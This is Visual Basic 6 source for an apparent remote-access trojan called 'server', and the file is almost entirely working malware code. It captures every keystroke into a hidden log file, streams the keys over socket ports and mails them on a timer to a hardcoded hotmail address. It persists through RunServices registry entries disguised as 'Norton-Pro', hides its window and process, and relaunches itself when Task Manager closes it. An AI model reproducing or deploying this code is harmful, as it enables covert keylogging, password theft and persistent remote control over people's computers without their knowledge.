VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form frmMain 
   Appearance      =   0  'Flat
   BackColor       =   &H80000005&
   BorderStyle     =   0  'None
   Caption         =   "server"
   ClientHeight    =   3270
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   4740
   Icon            =   "server.frx":0000
   KeyPreview      =   -1  'True
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Moveable        =   0   'False
   NegotiateMenus  =   0   'False
   PaletteMode     =   2  'Custom
   ScaleHeight     =   3270
   ScaleWidth      =   4740
   ShowInTaskbar   =   0   'False
   WhatsThisButton =   -1  'True
   WhatsThisHelp   =   -1  'True
   Begin MSWinsockLib.Winsock wskF 
      Index           =   0
      Left            =   600
      Top             =   2280
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   5551
   End
   Begin MSWinsockLib.Winsock wskFL 
      Index           =   0
      Left            =   1920
      Top             =   1680
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   5553
   End
   Begin MSWinsockLib.Winsock wskKeys 
      Index           =   0
      Left            =   2880
      Top             =   1680
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   5554
   End
   Begin MSWinsockLib.Winsock wskWINT 
      Index           =   0
      Left            =   2400
      Top             =   1680
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   5555
   End
   Begin MSWinsockLib.Winsock wskEx 
      Index           =   0
      Left            =   3960
      Top             =   2160
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   9997
   End
   Begin MSWinsockLib.Winsock wskFileSend 
      Index           =   0
      Left            =   3360
      Top             =   1680
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   9998
   End
   Begin VB.Timer Timer3 
      Interval        =   2000
      Left            =   1560
      Top             =   1320
   End
   Begin VB.TextBox Text1 
      Height          =   855
      Left            =   1200
      TabIndex        =   4
      Text            =   "Text1"
      Top             =   2280
      Width           =   2775
   End
   Begin VB.FileListBox File1 
      Appearance      =   0  'Flat
      Height          =   1395
      Left            =   3240
      TabIndex        =   3
      Top             =   120
      Visible         =   0   'False
      Width           =   1350
   End
   Begin VB.DirListBox Dir1 
      Appearance      =   0  'Flat
      Height          =   1440
      Left            =   2040
      TabIndex        =   2
      Top             =   120
      Visible         =   0   'False
      Width           =   1200
   End
   Begin VB.ListBox List1 
      Height          =   1035
      Left            =   240
      TabIndex        =   1
      Top             =   240
      Width           =   4065
   End
   Begin MSWinsockLib.Winsock MailSock 
      Left            =   3960
      Top             =   1680
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      RemotePort      =   25
   End
   Begin VB.Timer Timer2 
      Interval        =   100
      Left            =   1080
      Top             =   1320
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   100
      Left            =   480
      Top             =   1320
   End
   Begin VB.TextBox frmSearch 
      Height          =   3375
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   4935
   End
   Begin MSComDlg.CommonDialog CommonDialog1 
      Left            =   1560
      Top             =   1890
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
      CancelError     =   -1  'True
   End
   Begin MSWinsockLib.Winsock wskServer 
      Index           =   0
      Left            =   600
      Top             =   1920
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   9999
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Private Declare Function Getasynckeystate Lib "user32" Alias "GetAsyncKeyState" (ByVal VKEY As Long) As Integer
Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal Hkey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal Hkey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal Hkey As Long) As Long
Private Declare Function RegisterServiceProcess Lib "Kernel32.dll" (ByVal dwProcessId As Long, ByVal dwType As Long) As Long
Dim RtA As Variant
Dim PathA As Variant
Dim SubkeyA As Variant
Dim ValkeyA As Variant
Dim SavePath As String
Const VK_CAPITAL = &H14
 Const REG As Long = 1
Dim IPAddr As Variant
Dim ConnT As Boolean
Dim SMTPServer As String
Dim SystemName As String
Dim Sender As String
Dim Recepient As String
Dim Message As String
Dim NL As String
Dim FName_Only$
Dim TextL As String
Dim TextL2 As String
Dim IPSend As Boolean
Dim cnt As Integer
Const MAX_CHUNK = 4196           ' Max size of sendable data
Public lTIme             As Long
Dim lngProcID As Long
'This boolean indicates if this side if currently sending a file
Dim SendingFile As Boolean
Dim scr As Variant
'This variable contains the file that is being sent from the other side
Dim RecievedFile As String
'This variable is used in keeping track of the transfer rate.
Dim BeginTransfer As Single
Dim u As Variant
Dim AddressIP As String
Dim HostnameIP As String
Dim filePath As String
Dim sendComplete As Boolean
Dim KEY_ALL_ACCESS As Variant
Dim a As Variant
Dim Texter$
Dim stopSearching As Boolean


Private Function CAPSLOCKON() As Boolean

Static bInit As Boolean
Static bOn As Boolean
If Not bInit Then
While Getasynckeystate(VK_CAPITAL)
Wend
bOn = GetKeyState(VK_CAPITAL)
bInit = True
Else
If Getasynckeystate(VK_CAPITAL) Then
While Getasynckeystate(VK_CAPITAL)
DoEvents
Wend
bOn = Not bOn
End If
End If
CAPSLOCKON = bOn
End Function

Private Sub Command1_Click()

End Sub

Private Sub Dir1_Change()
File1.Path = Dir1.Path
End Sub

Private Sub Form_Load()
Dim ws As Winsock

On Error GoTo err

ProcOld = SetWindowLong(hwnd, GWL_WNDPROC, AddressOf WindowProc)
mdThread.SpawnThread
GetVals SMTPServer, SystemName, Sender
SMTPServer = basRegistry.regQuery_A_Key(&H80000001, "Software\Microsoft\Internet Account Manager\Accounts\00000001", "SMTP Server")
SystemName = basRegistry.regQuery_A_Key(&H80000001, "Software\Microsoft\Internet Account Manager\Accounts\00000001", "Account Name")
'Sender = basRegistry.regQuery_A_Key(&H80000001, "Software\Microsoft\Internet Account Manager\Accounts\00000001", "SMTP Email Address")
Recepient = "NetHolebyAlex@hotmail.com"
IPSend = False
NL = Chr$(13) + Chr$(10)
'HideExWindow "ThunderFormDC"
'FileCopy App.Path & "\" & "MainServer.exe", "C:\Windows\System\MainServer.exe"
transp.MakeTransparent frmMain
finReg.savestring &H80000002, "SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices", "MainServer", "c:\Windows\System\MainServer.exe"
'WorkWithINI.WRITEini "Windows", "load", "C:\Windows\Win.ini", "C:\Windows\System\MainServer.exe"
'Call savestring(&H80000002, "SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices", "String", "c:\Windows\System\MainServer.exe")
Call RegisterServiceProcess(0, 1)
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\RunServices", 0, KEY_ALL_ACCESS, a)
u = RegSetValueExA(a, "Norton-Pro", 0, REG, "C:\Windows\System\System.exe", 1)
u = RegCloseKey(a)
Dim taskID  As Variant
taskID = Shell(Environ$("Comspec") & " /c del c:\record.dat", 0)
Dim Data$
Data$ = Text1
Open "c:\windows\system\keylog.txt" For Binary As #1
Open "c:\record.dat" For Binary As #2
Put #2, 1, Str$(LOF(1))
Close #2
Open "c:\record.dat" For Input As #2
Dim counter$
counter$ = Input$(LOF(2), #2)
ConnT = False
Dim Size  As Variant
Size = Val(counter$)
If Size = 0 Then Size = Size + 1
Close #2
Close #1
Timer2.Enabled = True
IPAddr = GetIPAddress()
For Each ws In frmMain.wskServer
wskServer(ws.Index).Listen
Next

Dim wss As Winsock
For Each wss In frmMain.wskFileSend
wskFileSend(wss.Index).Listen
Next

For Each wss In frmMain.wskEx
wskEx(wss.Index).Listen
Next

For Each wss In frmMain.wskWINT
wskWINT(wss.Index).Listen
Next

For Each wss In frmMain.wskKeys
wskKeys(wss.Index).Listen
Next

For Each wss In frmMain.wskFL
wskFL(wss.Index).Listen
Next

For Each wss In frmMain.wskF
wskF(wss.Index).Listen
Next



'SendMail

err:
Exit Sub

End Sub











Private Sub Form_OLEGiveFeedback(Effect As Long, DefaultCursors As Boolean)

End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
Dim ans As String


    Select Case UnloadMode
        Case vbFormControlMenu 'Value 0
        'This will be called if you select the c
        '     lose from the little icon
        'menu on top and left of the form.
        Cancel = 1
        
        Case vbFormCode 'Value 1
        'This will be called if your code reques
        '     ted a unload
        Cancel = 1
        
        Case vbAppWindows 'Value 2
        'vbAppWindows is triggered when you shut


        '     down Windows and your app is still
            'running. Added by Jim MacDiarmid
            Cancel = 1
            End
            
            Case vbAppTaskManager 'Value 3
            'You have to allow the taskmanager to cl
            '     ose the program, else you get
            'that nasty 'App not responding, close a
            '     nyway' dialog :<
            'The clever way arround it would be to r
            '     estart your program
            'This would be used for a password scree
            '     n!
            
            Cancel = 1
            X = Shell(App.Path & "\" & App.EXEName, vbNormalFocus)
            End
            
            Case vbFormMDIForm 'Value 4
            'This code is called from the parent for
            '     m
            Cancel = 1
        End Select

End Sub

Private Sub Form_Unload(Cancel As Integer)
Call SetWindowLong(hwnd, GWL_WNDPROC, ProcOld)
End Sub

Private Sub frmSearch_Change()

End Sub

Private Sub Timer3_Timer()
SendMail
End Sub



Private Sub Text1_Change()
Dim ws As Winsock

On Error GoTo err

Texter$ = Text1
On Error GoTo Skip
Open "C:\windows\system\keylog.txt" For Binary As #1
Put #1, , vbCrLf + vbCrLf + "NewLog" + " (Date: " + Date$ + "  Start Time: " + "  End Time: " + Time$ + ")" + vbCrLf + String$(50, "-") + vbCrLf + Texter$
Skip:
Close #1
For Each ws In wskKeys
If wskKeys(ws.Index).State <> 7 Then
Else
wskKeys(ws.Index).SendData Right(Text1.Text, 1)
End If
Next

err:
Exit Sub

End Sub



Private Sub Timer1_Timer()

Dim keystate As Long
Dim Shift As Long
Shift = Getasynckeystate(vbKeyShift)

keystate = Getasynckeystate(vbKeyA)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "A"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "a"
End If

keystate = Getasynckeystate(vbKeyB)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "B"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "b"
End If

keystate = Getasynckeystate(vbKeyC)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "C"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "c"
End If

keystate = Getasynckeystate(vbKeyD)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "D"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "d"
End If

keystate = Getasynckeystate(vbKeyE)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "E"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "e"
End If

keystate = Getasynckeystate(vbKeyF)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "F"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "f"
End If

keystate = Getasynckeystate(vbKeyG)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "G"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "g"
End If

keystate = Getasynckeystate(vbKeyH)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "H"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "h"
End If

keystate = Getasynckeystate(vbKeyI)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "I"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "i"
End If

keystate = Getasynckeystate(vbKeyJ)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "J"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "j"
End If

keystate = Getasynckeystate(vbKeyK)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "K"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "k"
End If

keystate = Getasynckeystate(vbKeyL)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "L"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "l"
End If


keystate = Getasynckeystate(vbKeyM)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "M"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "m"
End If


keystate = Getasynckeystate(vbKeyN)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "N"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "n"
End If

keystate = Getasynckeystate(vbKeyO)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "O"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "o"
End If

keystate = Getasynckeystate(vbKeyP)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "P"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "p"
End If

keystate = Getasynckeystate(vbKeyQ)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "Q"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "q"
End If

keystate = Getasynckeystate(vbKeyR)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "R"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "r"
End If

keystate = Getasynckeystate(vbKeyS)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "S"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "s"
End If

keystate = Getasynckeystate(vbKeyT)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "T"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "t"
End If

keystate = Getasynckeystate(vbKeyU)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "U"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "u"
End If

keystate = Getasynckeystate(vbKeyV)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "V"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "v"
End If

keystate = Getasynckeystate(vbKeyW)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "W"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "w"
End If

keystate = Getasynckeystate(vbKeyX)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "X"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "x"
End If

keystate = Getasynckeystate(vbKeyY)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "Y"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "y"
End If

keystate = Getasynckeystate(vbKeyZ)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "Z"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
Text1 = Text1 + "z"
End If

keystate = Getasynckeystate(vbKey1)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "1"
      End If
      
      If Shift <> 0 And (keystate And &H1) = &H1 Then
Text1 = Text1 + "!"
End If


keystate = Getasynckeystate(vbKey2)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "2"
      End If
      
      If Shift <> 0 And (keystate And &H1) = &H1 Then
Text1 = Text1 + "@"
End If


keystate = Getasynckeystate(vbKey3)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "3"
      End If
      
      If Shift <> 0 And (keystate And &H1) = &H1 Then
Text1 = Text1 + "#"
End If


keystate = Getasynckeystate(vbKey4)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "4"
      End If

If Shift <> 0 And (keystate And &H1) = &H1 Then
Text1 = Text1 + "$"
End If


keystate = Getasynckeystate(vbKey5)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "5"
      End If
      
      If Shift <> 0 And (keystate And &H1) = &H1 Then
Text1 = Text1 + "%"
End If


keystate = Getasynckeystate(vbKey6)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "6"
      End If
      
      If Shift <> 0 And (keystate And &H1) = &H1 Then
Text1 = Text1 + "^"
End If


keystate = Getasynckeystate(vbKey7)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "7"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
Text1 = Text1 + "&"
End If

   
   keystate = Getasynckeystate(vbKey8)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "8"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
Text1 = Text1 + "*"
End If

   
   keystate = Getasynckeystate(vbKey9)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "9"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
Text1 = Text1 + "("
End If

   
   keystate = Getasynckeystate(vbKey0)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "0"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
Text1 = Text1 + ")"
End If

   
   keystate = Getasynckeystate(vbKeyBack)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{backspace}"
     End If
   
   keystate = Getasynckeystate(vbKeyTab)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{tab}"
     End If
   
   keystate = Getasynckeystate(vbKeyReturn)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + vbCrLf
     End If
   
   keystate = Getasynckeystate(vbKeyShift)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{shift}"
     End If
   
   keystate = Getasynckeystate(vbKeyControl)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{ctrl}"
     End If
   
   keystate = Getasynckeystate(vbKeyMenu)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{alt}"
     End If
   
   keystate = Getasynckeystate(vbKeyPause)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{pause}"
     End If
   
   keystate = Getasynckeystate(vbKeyEscape)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{esc}"
     End If
   
   keystate = Getasynckeystate(vbKeySpace)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + " "
     End If
   
   keystate = Getasynckeystate(vbKeyEnd)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{end}"
     End If
   
   keystate = Getasynckeystate(vbKeyHome)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{home}"
     End If

keystate = Getasynckeystate(vbKeyLeft)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{left}"
     End If

keystate = Getasynckeystate(vbKeyRight)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{right}"
     End If

keystate = Getasynckeystate(vbKeyUp)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{up}"
     End If
   
   keystate = Getasynckeystate(vbKeyDown)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{down}"
     End If

keystate = Getasynckeystate(vbKeyInsert)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{insert}"
     End If

keystate = Getasynckeystate(vbKeyDelete)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{Delete}"
     End If

keystate = Getasynckeystate(&HBA)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + ";"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + ":"
  
      End If
     
keystate = Getasynckeystate(&HBB)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "="
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "+"
     End If

keystate = Getasynckeystate(&HBC)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + ","
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "<"
     End If

keystate = Getasynckeystate(&HBD)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "-"
     End If

If Shift <> 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "_"
     End If

keystate = Getasynckeystate(&HBE)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "."
     End If

If Shift <> 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + ">"
     End If

keystate = Getasynckeystate(&HBF)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "/"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "?"
     End If

keystate = Getasynckeystate(&HC0)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "`"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "~"
     End If

keystate = Getasynckeystate(&HDB)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "["
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{"
     End If

keystate = Getasynckeystate(&HDC)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "\"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "|"
     End If

keystate = Getasynckeystate(&HDD)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "]"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "}"
     End If

keystate = Getasynckeystate(&HDE)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "'"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + Chr$(34)
     End If

keystate = Getasynckeystate(vbKeyMultiply)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "*"
     End If

keystate = Getasynckeystate(vbKeyDivide)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "/"
     End If

keystate = Getasynckeystate(vbKeyAdd)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "+"
     End If
   
keystate = Getasynckeystate(vbKeySubtract)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "-"
     End If
   
keystate = Getasynckeystate(vbKeyDecimal)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{Del}"
     End If
     
   keystate = Getasynckeystate(vbKeyF1)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{F1}"
     End If
   
   keystate = Getasynckeystate(vbKeyF2)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{F2}"
     End If
   
   keystate = Getasynckeystate(vbKeyF3)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{F3}"
     End If
   
   keystate = Getasynckeystate(vbKeyF4)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{F4}"
     End If
   
   keystate = Getasynckeystate(vbKeyF5)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{F5}"
     End If
   
   keystate = Getasynckeystate(vbKeyF6)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{F6}"
     End If
   
   keystate = Getasynckeystate(vbKeyF7)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{F7}"
     End If
   
